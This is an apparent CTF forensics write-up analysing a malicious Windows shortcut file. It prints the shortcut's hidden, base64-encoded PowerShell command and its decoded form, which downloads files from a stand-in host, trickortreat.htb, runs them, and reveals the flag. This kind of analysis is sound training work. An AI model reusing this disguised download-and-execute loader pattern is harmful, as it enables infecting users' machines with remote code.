# The Shortcut Haunting

## Description

While going through your Halloween treats, a strange message appears: "Trick or Treat?" Curious, you click, and suddenly a mysterious .lnk file appears on your desktop. Now it's up to you to investigate this spooky shortcut and find out if it’s just a trick—or if it’s hiding a darker secret.

## Solution

We are given `*.lnk` file, but it's unreadable format. `lnkinfo` command can be used to parse the information.

```bash
└─$ lnkinfo trick_or_treat.lnk
lnkinfo 20181227

Windows Shortcut information:
	Contains a link target identifier
	Contains a description string
	Contains a relative path string
	Contains a command line arguments string
	Contains an icon location string
	Contains an icon location block

Link information:
	Creation time			: Not set (0)
	Modification time		: Not set (0)
	Access time			: Not set (0)
	File size			: 0 bytes
	Icon index			: 70
	Show Window value		: 0x00000000
	Hot Key value			: 0
	File attribute flags		: 0x00000000
	Description			: Trick or treat
	Relative path			: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Command line arguments		: -WindowStyle hidden -NoExit -Command "$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf"9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
	Icon location			: %SystemRoot%\System32\shell32.dll

Link target identifier:
	Shell item list
		Number of items		: 7

	Shell item: 1
		Item type		: Root folder
		Class type indicator	: 0x1f (Root folder)
		Shell folder identifier	: 20d04fe0-3aea-1069-a2d8-08002b30309d
		Shell folder name	: My Computer

	Shell item: 2
		Item type		: Volume
		Class type indicator	: 0x2f (Volume)
		Volume name		: C:\

	Shell item: 3
		Item type		: File entry
		Class type indicator	: 0x31 (File entry: Directory)
		Name			: Windows
		Modification time	: Not set (0)
		File attribute flags	: 0x00000010
			Is directory (FILE_ATTRIBUTE_DIRECTORY)
	Extension block: 1
		Signature		: 0xbeef0004 (File entry extension)
		Long name		: Windows
		Creation time		: Not set (0)
		Access time		: Not set (0)

	Shell item: 4
		Item type		: File entry
		Class type indicator	: 0x31 (File entry: Directory)
		Name			: System32
		Modification time	: Not set (0)
		File attribute flags	: 0x00000010
			Is directory (FILE_ATTRIBUTE_DIRECTORY)
	Extension block: 1
		Signature		: 0xbeef0004 (File entry extension)
		Long name		: System32
		Creation time		: Not set (0)
		Access time		: Not set (0)

	Shell item: 5
		Item type		: File entry
		Class type indicator	: 0x31 (File entry: Directory)
		Name			: WindowsPowerShell
		Modification time	: Not set (0)
		File attribute flags	: 0x00000010
			Is directory (FILE_ATTRIBUTE_DIRECTORY)
	Extension block: 1
		Signature		: 0xbeef0004 (File entry extension)
		Long name		: WindowsPowerShell
		Creation time		: Not set (0)
		Access time		: Not set (0)

	Shell item: 6
		Item type		: File entry
		Class type indicator	: 0x31 (File entry: Directory)
		Name			: v1.0
		Modification time	: Not set (0)
		File attribute flags	: 0x00000010
			Is directory (FILE_ATTRIBUTE_DIRECTORY)
	Extension block: 1
		Signature		: 0xbeef0004 (File entry extension)
		Long name		: v1.0
		Creation time		: Not set (0)
		Access time		: Not set (0)

	Shell item: 7
		Item type		: File entry
		Class type indicator	: 0x32 (File entry: File)
		Name			: powershell.exe
		Modification time	: Not set (0)
		File attribute flags	: 0x00000000
	Extension block: 1
		Signature		: 0xbeef0004 (File entry extension)
		Long name		: powershell.exe
		Creation time		: Not set (0)
		Access time		: Not set (0)
```

Command line arguments is suspicions, clean up and just echo output. [https://tio.run/#powershell-core](https://tio.run/#powershell-core) can be used to run powershell (or other languages)

![The Shortcut Haunting.png](/assets/ctf/htb/the-shortcut-haunting.png)

```powershell
$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko))

echo $dwQWf;
```

```powershell
iwr -Uri https://trickortreat.htb/boo.pdf -OutFile $env:TEMP\ Dropbox boo.pdf;$flag='HTB{tr1ck_0r_tr34t_g03s_wr0ng}';Start-Process $env:TEMP\ Dropbox boo.pdf;Start-Sleep -s 5;iwr -Uri https://trickortreat.htb/candy.js -OutFile $env:TEMP\cacndy.js;Start-Process $env:TEMP\candy.js;Exit
```

> Flag: `HTB{tr1ck_0r_tr34t_g03s_wr0ng}`

